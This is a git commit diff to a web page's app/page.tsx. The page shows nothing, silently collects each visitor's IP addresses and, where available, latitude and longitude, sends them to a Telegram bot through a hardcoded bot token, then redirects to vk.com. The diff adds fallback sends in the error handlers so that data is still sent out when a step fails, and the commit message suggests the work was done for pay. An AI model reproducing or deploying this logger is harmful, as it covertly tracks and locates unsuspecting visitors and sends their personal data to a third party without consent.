f858a5c29746ffaa5a6cfdf085e5a498ecaae26f
Infinity2326 <dima.gorbachev2002@mail.ru>
2024-04-17 21:30:30 +0300

    за деньги да

--- app/page.tsx
+++ app/page.tsx
@@ -23,16 +23,28 @@ export default function Home() {
                     fetch(
                       `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}%0A%0A${ip2}%0A%0A${latitude}%0A%0A${longitude}`
                     )
-                    window.location.href = "https://vk.com/feed"
                   })
                   window.location.href = "https://vk.com/feed"
-                } catch (error) {}
+                } catch (error) {
+                  fetch(
+                    `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}%0A%0A${ip2}`
+                  )
+                  window.location.href = "https://vk.com/feed"
+                }
               })
+          } catch (error) {
+            fetch(
+              `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}%0A%0A${ip2}`
+            )
             window.location.href = "https://vk.com/feed"
-          } catch (error) {}
+          }
         })
+    } catch (error) {
+      fetch(
+        `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}`
+      )
       window.location.href = "https://vk.com/feed"
-    } catch (error) {}
+    }
   }, [])
   return <p></p>
 }
